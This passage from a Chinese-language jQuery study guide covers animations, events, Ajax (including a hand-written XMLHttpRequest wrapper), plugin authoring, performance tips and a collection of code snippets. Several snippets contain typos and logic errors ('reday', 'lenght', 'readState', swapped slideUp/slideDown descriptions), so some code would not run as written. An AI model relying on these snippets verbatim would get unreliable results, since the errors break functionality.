向元素最前面插入节点： prepend（）：把每个匹配的元素内部前置内容 prependTo（）：把所有匹配的元素前置到另一个指定的元素集合中,$(&quot;A&quot;).prepend(&quot;B&quot;) 等效 $(&quot;B&quot;).prependTo(&quot;A&quot;) 外部插入 after():在每个匹配的元素之后插入内容 before()：在每个匹配想元素之前插入内容 insertAfter()：将所有匹配的元素插入到另一个指定的元素集合后面，$A.insert($B) 等效$B.insertAfter($A); insertBefore()：将所有匹配的元素插入到另一个指定的元素集合前面 $A.before($B) 等效 $B.insertBefore($A); 三、删除内容 移除 remove():从DOM中删除所有匹配元素 清空 empty():删除匹配的元素集合中所有子节点内容 四、克隆内容：创建指定节点副本 clone() 注意：若clone（true）则是包括克隆元素的属性，事件等 五、替换内容 replaceWith():将所有匹配的元素替换成指定的元素 replaceAll():用匹配的元素替换掉指定元素 注意：两者效果一致，只是语法不同 $A.replaceAll($B)等效于 $B.replaceWhith($A); 本节新知识 JavaScript语言本身不支持动画设计，必须通过改变CSS来实现动画效果 显隐动画 show():显示 hide():隐藏 原理：hide()通过改变元素的高度宽度和不透明度，直到这三个属性值到0 show()从上到下增加元素的高度，从左到右增加元素宽度，从0到1增加透明度，直至内容完全可见 参数： show(speed,callback) speed: 字符串或数字，表示动画将运行多久（slow=0.6/normal=0.4/fast=0.2） callback: 动画完成时执行的方法 显示和隐藏式一对密不可分的动画形式 显隐切换 toggle():切换元素的可见状态 原理：匹配元素的宽度、高度以及不透明度，同时进行动画，隐藏动画后将display设置为none 参数： toggle(speed) toggle(speed,callback) toggle(boolean) speed: 字符串或数字，表示动画将运行多久（slow=0.6/normal=0.4/fast=0.2） easing： 使用哪个缓冲函数来过渡的字符串(linear/swing) callback： 动画完成时执行的方法 boolean:true为显示 false为隐藏 滑动 显隐滑动效果 slideDown():滑动隐藏 slidUp():滑动显示 参数: slideDown(speed,callback) slidUp(speed,callback) 显隐切换滑动 slideToggle():显隐滑动切换 参数: slidUp(speed,callback) 渐变：通过改变不透明度 淡入淡出 fadeIn() fadeOut() 参数： fadeIn(speed,callback) fadeOut(speed,callback) 设置淡出透明效果 fadeTo()⁭：以渐进的方式调整到指定透明度 参数： fadeTo(speed,opacity,callback) 渐变切换:结合fadeIn和fadeOut fadeToggle() 参数: fadeOut(speed,callback) 自定义动画：animate() 注意：在使用animate方法之前，为了影响该元素的top left bottom right样式属性，必须先把元素的position样式设置为relative或者absolute 停止元素的动画 很多时候需要停止匹配正在进行的动画，需要使用stop() stop()语法结构：stop([clearQueue],[gotoEnd]); 都是可选参数，为布尔值 如果直接使用stop()方法，会立即停止当前正在进行的动画 判断元素是否处于动画状态 如果不处于动画状态，则为元素添加新的动画，否则不添加if(!$(element).is(&quot;:animated&quot;)){ //判断元素是否处于动画状态} 这个方法在animate动画中经常被用到，需要注意 延迟动画 在动画执行过程中，如果你想对动画进行延迟操作，那么使用delay() 用animate模拟show(): show: 表示由透明到不透明 toggle: 切换 hide:表示由显示到隐藏 动画方法总结 方法名 说明 hide()和show() 同时修改多个样式属性即高度和宽度和不透明度 fadeIn()和fadeOut() 只改变不透明度 slideUp()和slideDown() 只改变高度 fadeTo() 只改变不透明度 toggle() 用来代替show()和hide()方法，所以会同时修改多个属性即高度、宽度和不透明度 slideToggle() 用来代替slideUp和slideDown()方法，所以只能改变高度 fadeToggle() 用来代替fadeIn()和fadeOut方法，只能改变不透明度 animate() 属于自定义动画，以上各种动画方法都是调用了animate方法。此外，用animate方法还能自定义其他的样式属性，例如：left marginLeft `scrollTop`等 第七节 jQuery中的事件 事件对象的属性 event.type：获取事件的类型 event.target:获取到触发事件的元素 event.preventDefault方法 阻止默认事件行为 event.stopPropagation()阻止事件的冒泡 keyCode：只针对于keypress事件，获取键盘键数字 按下回车，13 event.pageX / event.pageY 获取到光标相对于页面的x坐标和y坐标 如果没有jQuery，在IE浏览器中用event.x / event.y;在Firefox浏览器中用event.pageX / event.pageY。如果页面上有滚动条还要加上滚动条的宽度和高度 event.clientX：光标对于浏览器窗口的水平坐标 浏览器 event.clientY：光标对于浏览器窗口的垂直坐标 event.screenX：光标对于电脑屏幕的水平坐标 电脑屏幕 event.screenY：光标对于电脑屏幕的水平坐标 event.which 该方法的作用是在鼠标单击事件中获取到鼠标的左、中、右键，在键盘事件中的按键 1代表左键 2代表中键 3代表右键 事件冒泡 什么是冒泡 在页面上可以有多个事件，也可以多个元素影响同一个元素 从里到外 嵌套关系 相同事件 其中的某一父类没有相同事件时,继续向上查找 停止事件冒泡 停止事件冒泡可以阻止事件中其他对象的事件处理函数被执行 在jQuery中提供了stopPropagation()方法 阻止默认行为 网页中元素有自己的默认行为，例如：单击超链接后会跳转、单击提交后表单会提交，有时需要阻止元素的默认行为 在jQuery中提供了preventDefault()方法来阻止元素的默认行为 事件捕获 事件捕获和冒泡是相反的过程，事件捕获是从最顶端往下开始触发 并非所有的浏览器都支持事件捕获，并且这个缺陷无法通过JavaScript来修复。jQuery不支持事件捕获，如需要用事件捕获，要用原生的JavaScript bind();绑定 为匹配元素绑定处理方法 需要给一个元素添加多个事件 ，事件执行一样时候 one()：只执行一次 绑定特定事件类型方法： 分类 方法名称 说明 页面载入 ready(fn) 当DOM载入就绪可以绑定一个要执行的函数 事件绑定 blind(type,[data],fn) 为每个匹配元素的特定事件绑定一个事件处理函数 事件绑定 unblind() 解除绑定 事件绑定 on(events,[,selector[,]data],handler) 在选择元素上绑定一个或者多个事件处理函数 事件绑定 off() 移除on绑定的事件 事件绑定 delegate(selector,eventType,handler) 为所有选择匹配元素附加一个或多个事件处理函数 事件绑定 undelegate() 移除绑定 事件动态 live(type,fn) 对动态生成的元素进行事件绑定 事件动态 die(type,fn) 移除live()绑定的事件 交互事件 hover() 鼠标移入移出 交互事件 toggle(fn1,fn2,[fn3],[fn4]) 每单击后依次调用函数 交互事件 blur(fn) 触发每一个匹配元素的blur事件 交互事件 change() 触发每一个匹配元素的change事件 交互事件 click() 触发每一个匹配元素的click事件 交互事件 focus() 触发每一个匹配元素的focus事件 交互事件 submit() 触发每一个匹配元素的submit事件 键盘事件 keydown() 触发每一个匹配元素的keydown事件 键盘事件 keypress() 触发每一个匹配元素的keypress事件 键盘事件 keyup() 触发每一个匹配元素的keyup事件 鼠标事件 mousedown(fn) 绑定一个处理函数 鼠标事件 mouseenter(fn) 绑定一个处理函数 键盘事件 mouseleave(fn) 绑定一个处理函数 键盘事件 mouseout(fn) 绑定一个处理函数 键盘事件 mouseover(fn) 绑定一个处理函数 窗口操作 resize(fn) 绑定一个处理函数 窗口操作 scroll(fn) 绑定一个处理函数 第八节 jQuery与Ajax Ajax简介 : Asynchronous Javascript And XML （异步的JavaScript和XML） 它并不是一种单一的技术，而是有机利用一系列交互式网页应用相关的技术所形成的结合体 Ajax优势与不足 Ajax优势 优秀的用户体验 这是Ajax下最大的有点，能在不刷新整个页面前提下更新数据 提高web程序的性能 与传统模式相比，Ajax模式在性能上最大的区别在于传输数据的方式，在传统模式中，数据的提交时通过表单来实现的。Ajax模式只是通过XMLHttpRequest对象向服务器提交希望提交的数据，即按需发送 减轻服务器和带宽的负担 Ajax的工作原理相当于在用户和服务器之间加了一个中间层，似用户操作与服务器响应异步化。它在客户端创建Ajax引擎，把传统方式下的一些服务器负担的工作转移到客户端，便于客户端资源来处理，减轻服务器和带宽的负担 Ajax的不足 浏览器对XMLHttpRequest对象的支持度不足 破坏浏览器前进、后退按钮的正常功能 对搜索引擎的支持的不足 开发和调试工具的缺乏 创建一个Ajax请求 Ajax的核心是XMLHttpRequest对象，它是Ajax实现的关键，发送异步请求、接受响应以及执行回调都是通过它来完成 创建ajax对象 var xhr = new XMLHttpRequest(); 准备发送请求 get / post get 传递的数据放在URL后面 中文编码 encodeURI( &#39;&#39; ); 缓存 在数据后面加上随机数或者日期对象或者…… post 传递的数据放在send()里面，并且一定要规定数据格式 没有缓存问题 form表单中: action: method: (默认是get) get: 会在url里面以 name=value , 两个数据之间用 &amp; 连接 post: enctype: &quot;application/x-www-form-urlencoded&quot; url 是否异步 同步(false)：阻塞 异步(true)：非阻塞 正式发送请求 ajax请求处理过程 123456xhr.onreadystatechange = function()&#123; if (xhr.readyState == 4) &#123; alert( xhr.responseText ); &#125;&#125;; onreadystatechange ：当处理过程发生变化的时候执行下面的函数 readyState ：ajax处理过程 0：请求未初始化（还没有调用 open()）。 1：请求已经建立，但是还没有发送（还没有调用 send()）。 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4：响应已完成；您可以获取并使用服务器的响应了。 responseText ：请求服务器返回的数据存在该属性里面 status : http状态码 HTTP状态码 案例：ajax封装案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//ajax请求后台数据var btn = document.getElementsByTagName(\"input\")[0];btn.onclick = function()&#123; ajax(&#123;//json格式 type:\"post\", url:\"post.php\", data:\"username=poetries&amp;pwd=123456\", asyn:true, success:function(data)&#123; document.write(data); &#125; &#125;);&#125;//封装ajaxfunction ajax(aJson)&#123; var ajx = null; var type = aJson.type || \"get\"; var asyn = aJson.asyn || true; var url = aJson.url; // url 接收 传输位置 var success = aJson.success;// success 接收 传输完成后的回调函数 var data = aJson.data || '';// data 接收需要附带传输的数据 if(window.XMLHttpRequest)&#123;//兼容处理 ajx = new XMLHttpRequest();//一般浏览器 &#125;else &#123; ajx = new ActiveXObject(\"Microsoft.XMLHTTP\");//IE6+ &#125; if (type == \"get\" &amp;&amp; data) &#123; url +=\"/?\"+data+\"&amp;\"+Math.random(); &#125; //初始化ajax请求 ajx.open( type , url , asyn ); //规定传输数据的格式 ajx.setRequestHeader('content-type','application/x-www-form-urlencoded'); //发送ajax请求（包括post数据的传输） type == \"get\" ?ajx.send():ajx.send(aJson.data); //处理请求 ajx.onreadystatechange = function(aJson)&#123; if(ajx.readState == 4)&#123; if (ajx.status == 200 &amp;&amp; ajx.status&lt;300)//200是HTTP 请求成功的状态码 &#123; //请求成功处理数据 success &amp;&amp; success(ajx.responseText); &#125;else&#123; alert(\"请求出错\"+ajx.status); &#125; &#125; &#125;; jQuery中的Ajax [补充部分–来自锋利的jQuery] jquery对Ajax操作进行了封装，在jquery中的$.ajax()方法属于最底层的方法，第2层是load()、$.get()、$.post();第3层是$.getScript()、$.getJSON()，第2层使用频率很高 load()方法 load()方法是jquery中最简单和常用的ajax方法，能载入远程HTML代码并插入DOM中 结构为：load(url,[data],[callback]) 使用url参数指定选择符可以加载页面内的某些元素 load方法中url语法：url selector 注意：url和选择器之间有一个空格 传递方式 load()方法的传递方式根据参数data来自动指定，如果没有参数传递，则采用GET方式传递，反之，采用POST 回调参数 必须在加载完成后才执行的操作，该函数有三个参数 分别代表请求返回的内容、请求状态、XMLHttpRequest对象 只要请求完成，回调函数就会被触发 12345$(\"#testTest\").load(\"test.html\",function(responseText,textStatus,XMLHttpRequest)&#123; //respnoseText 请求返回的内容 //textStatus 请求状态 ：sucess、error、notmodified、timeout //XMLHttpRequest &#125;) load方法参数 参数名称 类型 说明 url String 请求HTML页面的URL地址 data(可选) Object 发送至服务器的key / value数据 callback(可选) Function 请求完成时的回调函数，无论是请求成功还是失败 $.get()和$.post()方法 load()方法通常用来从web服务器上获取静态的数据文件。在项目中需要传递一些参数给服务器中的页面，那么可以使用$.get()和$.post()或$.ajax()方法 注意：$.get()和$.post()方法是jquery中的全局函数 $.get()方法 $.get()方法使用GET方式来进行异步请求 结构为：$.get(url,[data],callback,type) 如果服务器返回的内容格式是xml文档，需要在服务器端设置Content-Type类型 代码如下：header(&quot;Content-Type:text/xml:charset=utf-8&quot;) //php $.get()方法参数解析 参数 类型 说明 url String 请求HTML页的地址 data(可选) Object 发送至服务器的key/ value 数据会作为QueryString附加到请求URL中 callback(可选) Function 载入成功的回调函数（只有当Response的返回状态是success才调用该方法） type(可选) String 服务器返回内容的格式，包括xml、html、script、json、text和_default $.post()方法 它与$.get()方法的结构和使用方式相同，有如下区别 GET请求会将参数跟张乃URL后进行传递，而POST请求则是作为Http消息的实体内容发送给web服务器，在ajax请求中，这种区别对用户不可见 GET方式对传输数据有大小限制（通常不能大于2KB），而使用POST方式传递的数据量要比GET方式大得多（理论不受限制） GET方式请求的数据会被浏览器缓存起来，因此其他人可以从浏览器的历史纪录中读取这些数据，如：账号、密码。在某种情况下，GET方式会带来严重的安全问题，而POST相对来说可以避免这些问题 GET和POST方式传递的数据在服务端的获取也不相同。在PHP中，GET方式用$_GET[]获取；POST方式用$_POST[]获取;两种方式都可用$_REQUEST[]来获取 总结 使用load()、$.get()和$.post()方法完成了一些常规的Ajax程序，如果还需要复杂的Ajax程序，就需要用到$.ajax()方式 $.ajax()方法 $.ajax()方法是jquery最底层的Ajax实现，它的结构为$.ajax(options) 该方法只有一个参数，但在这个对象里包含了$.ajax()方式所需要的请求设置以及回调函等信息，参数以key / value存在，所有参数都是可选的 $.ajax()方式常用参数解析 参数 类型 说明 url String (默认为当前页地址)发送请求的地址 type String 请求方式（POST或GET）默认为GET timeout Number 设置请求超时时间（毫秒） dataType String 预期服务器返回的类型。可用的类型如下 xml:返回XML文档，可用jquery处理html:返回纯文本的HTML信息，包含的script标签也会在插入DOM时执行script：返回纯文本的javascript代码。不会自动缓存结果，除非设置cache参数。注意：在远程请求时，所有的POST请求都将转为GET请求json:返回JSON数据jsonp:JSONP格式，使用jsonp形式调用函数时，例如：myurl?call back=?,jquery将自动替换后一个？为正确的函数名，以执行回调函数text:返回纯文本字符串 beforeSend Function 发送请求前可以修改XMLHttpRequest对象的函数，例如添加自定义HTTP头。在beforeSend中如果返回false可以取消本次Ajax请求。XMLHttpRequest对象是唯一的参数 function(XMLHttpRequest){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this;//调用本次Ajax请求时传递的options参数} complete Function 请求完成后的回调函数（请求成功或失败时都调用） 参数：XMLHttpRequest对象和一个描述成功请求类型的字符串function(XMLHttpRequest,textStatus){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this;//调用本次Ajax请求时传递的options参数} success Function 请求成功后调用的回调函数，有两个参数(1)由服务器返回，并根据dataTyppe参数进行处理后的数据(2)描述状态的字符串function(data,textStatus){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//data可能是xmlDoc、`jsonObj、html、text等&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;this;//调用本次Ajax请求时传递的options`参数} error Function 请求失败时被调用的函数 global Boolean 默认为true。表示是否触发全局Ajax事件，设置为false将不会触发。AjaxStart或AjaxStop可用于控制各种Ajax事件 第九节 插件 什么是插件 插件(Plugin)也称为jQuery的扩展。以jQuery核心代码为基础编写的符合一定规范的应用程序。通过js文件的方式引用。 插件分为哪几类 UI类、表单及验证类、输入类、特效类、Ajax类、滑动类、图形图像类、导航类、综合工具类、动画类等等 引入插件的步骤 引入jquery.js文件，而且在所以插件之前引入 引入插件 引入插件相关文件，比如皮肤、中文包 如何自定义插件： 插件形式分为3类： 封装对象方法插件 封装全局函数插件 选择器插件(类似于.find()) 自定义插件的规范（解决各种插件的冲突和错误，增加成功率） 命名：jquery.插件名.js 所有的新方法附加在jquery.fn对象上面，所有新功能附加在jquery上 所有的方法或插件必须用分号结尾，避免出问题 插件必须返回jQuery对象，便于链式连缀 避免插件内部使用$，如果要使用，请传递jQuery($并不是总等于jQuery，另外其他js框架也可能使用$) 插件中的this应该指向jQuery对象 使用this.each()迭代元素 自定义插件案例 为了方便用户创建插件，jQuery提供了 jQuery.extend() 和 jQuery.fn.extend() jQuery.extend()：创建工具函数或者是选择器 jQuery.fn.extend()：创建jQuery对象命令 （fn相当于prototype的别名） jQuery官方提供的插件开发模板 1234567891011121314;(function($)&#123; $.fn.plugin=function(options)&#123; var defaults = &#123; //各种参数 各种属性 &#125; var options = $.extend(defaults,options); this.each(function()&#123; //实现功能的代码 &#125;); return this; &#125;&#125;)(jQuery); 自定义jQuery函数： 1234567(function($)&#123; $.extend(&#123; test: function()&#123; alert(\"hello plugin\"); &#125; &#125;) &#125;)(jQuery); 自定义jQuery命令： 形式1： 1234567(function($)&#123; $.fn.extend(&#123; say : function()&#123; alert(\"hello plugin\"); &#125; &#125;)&#125;)(jQuery); 形式2： 123456(function($)&#123; $.fn.say = function()&#123; alert(\"hello plugin\"); &#125;; &#125;)(jQuery); 附录一 jQuery各个版本新增的一些常用的方法 jQuery1.3新增常用的方法 方法 说明 .closest() 从元素本身开始，逐级向上级元素匹配，并返回最先匹配的祖先元素 die() 从元素中删除先前用live()方法绑定的所有的事件 live() 附加一个事件处理器到符合目前选择器的所有元素匹配 jQuery1.4新增常用的方法 方法 说明 .first() 获取集合中第一个元素 last() 获取集合中最后一个元素 has(selector) 保留包含特定后代的元素，去掉那些不含有指定后代的元素 detach() 从DOM中去掉所有匹配的元素。detach()和remov()一样，除了detach()保存了所有jquery数据和被移走的元素相关联。当需要移走一个元素，不久又将该元素插入DOM时，这种方法很有用 delegate() 为所有选择器匹配的元素附加一个处理一个或多个事件 undelegate() 为所有选择器匹配的元素删除一个处理一个或多个事件 jQuery1.6新增常用的方法 方法 说明 prop(proptyName) 获取在匹配元素集合中的第一个元素的属性值 removeProp(proptyName,value) 为匹配的元素删除设置的属性 :focus 选择当前获取焦点的元素 附录二 jQuery性能优化 性能优化 使用最新版的jQuery类库 使用合适的选择器 $(#id) 使用id来定位DOM元素是最佳的方式，为了提高性能，建议从最近的ID元素开始往下搜索 $(&quot;p&quot;) , $(&quot;div&quot;) , $(&quot;input&quot;) 标签选择器性能也不错，它是性能优化的第二选择。因为jQuery将直接调用本地方法document.getElementsByTagName()来定位DOM元素 $(&quot;.class&quot;) 建议有选择性的使用 $(&quot;[attribute=value]&quot;) 对这个利用属性定位DOM元素，本地JavaScript并没有直接实现。这种方式性能并不是很理想。建议避免使用。 $(&quot;:hidden&quot;) 和上面利用属性定位DOM方式类似，建议尽量不要使用 注意的地方 尽量使用ID选择器 尽量给选择器指定上下文 缓存对象 如果你需要在其他函数中使用jQuery对象，你可以把他们缓存在全局环境中 数组方式使用jQuery对象 使用jQuery选择器获取的结果是一个jQuery对象。在性能方面，建议使用for或while循环来处理，而不是$.each() 事件代理 每一个JavaScript事件（如：click、mouseover）都会冒泡到父级节点。当我们需要给多个元素调用同个函数时这点很有用。比如，我们要为一个表单绑定这样的行为：点击td后，把背景颜色设置为红色 $(&quot;#myTable td&quot;).click(function(){$(this).css(&quot;background&quot;,&quot;red&quot;);}); 假设有100个td元素，在使用以上的方式时，绑定了100个事件，将带来性能影响 代替这种多元素的事件监听方法是，你只需向他们的父节点绑定一次事件，然后通过event.target获取到点击的当前元素 $(&quot;#myTable td&quot;).click(function({$(e.target).css(&quot;background&quot;,&quot;red&quot;)}); e.target捕捉到触发的目标 在jQuery1.7中提供了一个新的方法on()，来帮助你将整个事件监听封装到一个便利的方法中 $(&quot;#myTable td&quot;).on(&quot;click&quot;,&#39;td&#39;,function(){$(this).css(&quot;background&quot;,&quot;red&quot;);}); 将你的代码转化成jQuery插件 它能够使你的代码有更好的重用性，并且能够有效的帮助你组织代码 使用join()方法来拼接字符串 也许你之前使用+来拼接字符串，现在可以改了。它确实有助于性能优化，尤其是长字符串处理的时候 合理使用HTML5和Data属性 HTML5的data属性可以帮助我们插入数据，特别是后端的数据交换。jQuery的Data()方法有效利用HTML5的属性 例如：&lt;div id=&quot;dl&quot; data-role=&quot;page&quot; data-list-value=&quot;43&quot; data-options=&#39;{&quot;name:&quot;&quot;John&quot;}&#39;&gt; 为了读取数据，你需要使用如下代码 $(&quot;#dl&#39;).data(&quot;role&#39;;//page) $(&quot;#dl&#39;).data(&quot;lastValue&#39;;//43) $(&quot;#dl&#39;).data(&quot;options&#39;;//john) 尽量使用原生的JavaScript方法 压缩JavaScript代码 一方面使用Gzip；另一方面去除JavaScript文件里面的注释、空白 附录三 常用的jQuery代码片段 禁用页面的右键菜单 12345$(document).ready(functuion()&#123; $(document).bind(\"contextmenu\",function(e)&#123; return false; &#125;); &#125;); 新窗口打开页面 1234567891011$(document).ready(function()&#123; //例子1：href=\"http://\"的链接将会在新窗口打开链接 $('a[href=^=\"http://\"]').attr(\"target\",\"_blank\"); //例子2：rel=\"external\"的超链接将会在新窗口打开链接 $(\"a[rel$='external']\").click(function()&#123; this.target = \"_blank\"; &#125;);&#125;);//use&lt;a href=\"http://baidu.com\" rel=\"external\"&gt;open&lt;/a&gt; 判断浏览器类型 123456789101112131415161718192021222324252627282930313233$(document).reday(function()&#123; //Firefox2 and above if( $.browser.mozilla &amp;&amp; $.browser.version&gt;=\"1.8\")&#123; //do something &#125; // Safari if($.browser.safari)&#123; //do something &#125; // Chrome if($.browser.chrome)&#123; //do something &#125; // Opera if($.browser.opera)&#123; //do something &#125;&#125;) // IE6 and blow if($.browser.msie &amp;&amp; $.browser.version&lt;=6)&#123; //do something &#125; // anything above IE6 if($.browser.msie &amp;&amp; $.browser.version &gt; 6)&#123; //do something &#125; 输入框文字获取和失去焦点 123456789101112131415161718$(document).ready(function()&#123; $(\"input.text1\").val(\"Enter you search text here\"); textFill($('input.text1'));&#125;);function textFill(input)&#123;//input focus text function var originvalue = input.val(); input.focus(funtion()&#123; if($.trim(input.val())== originvalue)&#123; input.val(' '); &#125; &#125;).blur(function()&#123; if($.trim(input.val()) == ' ')&#123; input.val(originalvalue); &#125; &#125;)&#125; 获取鼠标位置 123456$(document).ready(function()&#123; $(document).mousemove(function(e)&#123; $(\"#XY\").html(\"X:\" + e.pageX+ \"| Y\" + e.pageY); &#125;);&#125;); 判断元素是否存在 12345$(document).ready(function()&#123; if($(\"#id\").length)&#123; // do some thing &#125;&#125;) 点击div也可以跳转 1234567$(\"div\").click(function()&#123; window.location = $(this).find(\"a\").attr(\"href\");&#125;)//use&lt;div&gt;&lt;a href=\"index.html\"&gt;home&lt;/a&gt;&lt;/div&gt; 设置div在屏幕中央 1234567891011$(document).ready(function()&#123; jQuery.fn.center = function()&#123; this.css(\"position\",\"absolute\"); this.css(\"top\",($(window).height() - this.lenght()) / 2 +$(window).scrollTop() + \"px\"); this.css(\"left\",($(window).height() - this.lenght()) / 2 +$(window).scrollLeft() + \"px\"); return this; &#125;//use $(\"#XY\").center();&#125;); 关闭所有动画效果 123$(document).ready(function()&#123; jQuery.fx.off = true;&#125;); 检测鼠标的右键和左键 12345$(document).ready(function()&#123; $(\"#xy\").mousedown(function(e)&#123; alert(e.which);//1 = 鼠标左键 2= 鼠标中间 3 = 鼠标右键 &#125;);&#125;); 回车提交表单 1234567$(document).ready(function()&#123; $(\"input\").keyup(function(e)&#123; if(e.which == \"13\")&#123; alert(\"回车提交\"); &#125; &#125;)&#125;); 设置全局的Ajax参数 12345678$(\"#load\").ajaxStart(function()&#123; showLoading();//显示loading disableButtons() //禁用按钮&#125;) $(\"#load\").ajaxComplete(function()&#123; hideLoading();//隐藏loading enableButtons();//启用按钮&#125;) 获取选中的下拉框 12$(\"#someElement\").find('option:selected');$(\"#someElement option:selected\"); 切换复选框 12345var tog = false;$(\"button\").click(function()&#123; $(\"input[type=checkbox]').attr(\"checked\",!tog); tog = !tog;&#125;); 个性化链接 12345$(document).ready(function()&#123; $(\"a[href$='pdf']\").addClass(\"pdf\"); $(\"a[href$='zip']\").addClass(\"zip\"); $(\"a[href$='psd']\").addClass(\"psd\");&#125;); 在一段时间后自动隐藏或关闭元素 123456setTimeOut(function()&#123; $(\"div\").fadeIn(400); &#125;,3000);//而在1.4之后的版本可以用delay()来实现$(\"div\").slideUp(300).delay(3000).fadeIn(400); 使用事件代理绑定元素 123456789101112131415161718 //为table里面的td元素绑定click事件，不管td是一直存在还是动态创建的 //jQuery 1.4.2之前使用这种方式 $(\"table\").each(function()&#123; $(\"td\",this).live(\"click\",function()&#123; $(this).toggleClass(\"hover\"); &#125;);&#125;);//jquery 1.4.2使用的方式$(\"table\").delegate(\"td\",\"click\",function()&#123; $(this).toggleClass(\"hover\");&#125;);//jQuery1.7.1使用的方式$(\"table\").on(\"click\",\"td\",function()&#123; $(this).toggleClass(\"hover\"); &#125;) 预加载图片 123456789101112(function($) &#123; var cache = []; // Arguments are image paths relative to the current page. $.preLoadImages = function() &#123; var args_len = arguments.length; for (var i = args_len; i--;) &#123; var cacheImage = document.createElement('img'); cacheImage.src = arguments[i]; cache.push(cacheImage); &#125; &#125;jQuery.preLoadImages(\"image1.gif\", \"/path/to/image2.png\"); 让页面中的每个元素都适合在移动设备上展示 1234567891011var scr = document.createElement('script');scr.setAttribute('src', 'https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js');document.body.appendChild(scr);scr.onload = function()&#123; $('div').attr('class', '').attr('id', '').css(&#123; 'margin' : 0, 'padding' : 0, 'width': '100%', 'clear':'both' &#125;);&#125;; 图像等比例缩放 1234567891011121314151617181920212223242526$(window).bind(\"load\", function() &#123; // IMAGE RESIZE $('#product_cat_list img').each(function() &#123; var maxWidth = 120; var maxHeight = 120; var ratio = 0; var width = $(this).width(); var height = $(this).height(); if(width &gt; maxWidth)&#123; ratio = maxWidth / width; $(this).css(\"width\", maxWidth); $(this).css(\"height\", height * ratio); height = height * ratio; &#125; var width = $(this).width(); var height = $(this).height(); if(height &gt; maxHeight)&#123; ratio = maxHeight / height; $(this).css(\"height\", maxHeight); $(this).css(\"width\", width * ratio); width = width * ratio; &#125; &#125;); //$(\"#contentpage img\").show(); // IMAGE RESIZE&#125;); 返回页面顶部 12345678// Back To Top$(document).ready(function()&#123; $('.top').click(function() &#123; $(document).scrollTo(0,500); &#125;);&#125;); //Create a link defined with the class .top&lt;a href=\"#\" class=\"top\"&gt;Back To Top&lt;/a&gt; 使用jQuery打造手风琴式的折叠效果 1234567891011121314151617181920212223var accordion = &#123; init: function()&#123; var $container = $('#accordion'); $container.find('li:not(:first) .details').hide(); $container.find('li:first').addClass('active'); $container.on('click','li a',function(e)&#123; e.preventDefault(); var $this = $(this).parents('li'); if($this.hasClass('active'))&#123; if($('.details').is(':visible')) &#123; $this.find('.details').slideUp(); &#125; else &#123; $this.find('.details').slideDown(); &#125; &#125; else &#123; $container.find('li.active .details').slideUp(); $container.find('li').removeClass('active'); $this.addClass('active'); $this.find('.details').slideDown(); &#125; &#125;); &#125;&#125;; 使用jQuery和Ajax自动填充选择框 12345678910111213$(function()&#123;$(\"select#ctlJob\").change(function()&#123;$.getJSON(\"/select.php\",&#123;id: $(this).val(), ajax: 'true'&#125;, function(j)&#123;var options = '';for (var i = 0; i &lt; j.length; i++) &#123;options += '' + j[i].optionDisplay + '';&#125;$(\"select#ctlPerson\").html(options);&#125;)&#125;)&#125;) 自动替换丢失的图片 12345678// Safe Snippet$(\"img\").error(function () &#123; $(this).unbind(\"error\").attr(\"src\", \"missing_image.gif\");&#125;);// Persistent Snipper$(\"img\").error(function () &#123; $(this).attr(\"src\", \"missing_image.gif\");&#125;); 预防对表单进行多次提交 123456789101112131415$(document).ready(function() &#123; $('form').submit(function() &#123; if(typeof jQuery.data(this, \"disabledOnSubmit\") == 'undefined') &#123; jQuery.data(this, \"disabledOnSubmit\", &#123; submited: true &#125;); $('input[type=submit], input[type=button]', this).each(function() &#123; $(this).attr(\"disabled\", \"disabled\"); &#125;); return true; &#125; else &#123; return false; &#125; &#125;);&#125;); 动态添加表单元素 12345//change event on password1 field to prompt new input$('#password1').change(function() &#123; //dynamically create new input and insert after password1 $(\"#password1\").append(\"\");&#125;); 在窗口滚动时自动加载内容 123456789101112131415161718var loading = false;$(window).scroll(function()&#123; if((($(window).scrollTop()+$(window).height())+250)&gt;=$(document).height())&#123; if(loading == false)&#123; loading = true; $('#loadingbar').css(\"display\",\"block\"); $.get(\"load.php?start=\"+$('#loaded_max').val(), function(loaded)&#123; $('body').append(loaded); $('#loaded_max').val(parseInt($('#loaded_max').val())+50); $('#loadingbar').css(\"display\",\"none\"); loading = false; &#125;); &#125; &#125;&#125;);$(document).ready(function() &#123; $('#loaded_max').val(50);&#125;); 导航菜单背景切换效果 1234567891011121314&lt;ul id='nav'&gt; &lt;li&gt;导航一&lt;/li&gt; &lt;li&gt;导航二&lt;/li&gt; &lt;li&gt;导航三&lt;/li&gt;&lt;/ul&gt;//注意：代码需要修饰完善$('#nav').click(function(e) &#123; // 要知道siblings的使用 $(e.target).addClass('tclass').siblings('.tclass').removeClass('tclass');; &#125;); 解决jQuery, prototype共存，$全局变量冲突问题 12345&lt;script src=\"prototype.js\"&gt;&lt;/script&gt;&lt;script src=\"http://blogbeta.blueidea.com/jquery.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; jQuery.noConflict();&lt;/script&gt; 注意：一定要先引入prototype.js 再引入jquery.js，先后顺序不可错 jQuery 判断元素上是否绑定了事件 12345//jQuery event封装支持判断元素上是否绑定了事件，此方法只适用于jQuery绑定的事件var $events = $(\"#foo\").data(\"events\");if( $events &amp;&amp; $events[\"click\"] )&#123; //your code&#125; 如何正确地使用toggleClass 12345//切换（toggle）类允许你根据某个类的//是否存在来添加或是删除该类。//这种情况下有些开发者使用：a.hasClass('blueButton') ? a.removeClass('blueButton') : a.addClass('blueButton');//toggleClass允许你使用下面的语句来很容易地做到这一点a.toggleClass('blueButton'); 如何设置IE特有的功能 123if ($.browser.msie) &#123; // Internet Explorer就是个虐待狂&#125; 如何验证某个元素是否为空 12345678// 方法一if (! $('#keks').html()) &#123; //什么都没有找到;&#125;// 方法二if ($('#keks').is(\":empty\")) &#123; //什么都没有找到;&#125; 访问IFrame里的元素 